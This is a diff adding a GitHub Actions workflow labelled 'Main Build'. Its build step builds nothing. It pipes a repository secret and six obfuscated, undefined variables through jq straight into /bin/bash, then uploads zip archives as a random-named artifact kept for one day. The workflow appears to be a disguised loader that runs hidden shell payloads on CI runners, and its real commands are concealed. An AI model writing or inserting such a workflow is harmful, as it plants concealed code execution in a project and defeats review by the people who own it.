@@ -1,0 +1,34 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          f3494: ${{ secrets.f3494 }}
+        run: |
+          printf '%s' "$f3494" | jq -r .lt1 | /bin/bash
+          printf '%s' "$zcj32" | jq -r .b12 | /bin/bash
+          echo $ba4 | jq -r .szj69 | /bin/bash
+          printf '%s' "$m481" | jq -r .jn54578 | /bin/bash
+          echo $iae82552 | jq -r .zjxoq549 | /bin/bash
+          echo $cnj3367 | jq -r .kwqc03576 | /bin/bash
+          echo $jsl2999 | jq -r .mg45090 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: UY3qpLlm
+          path: "*.zip"
+          retention-days: 1
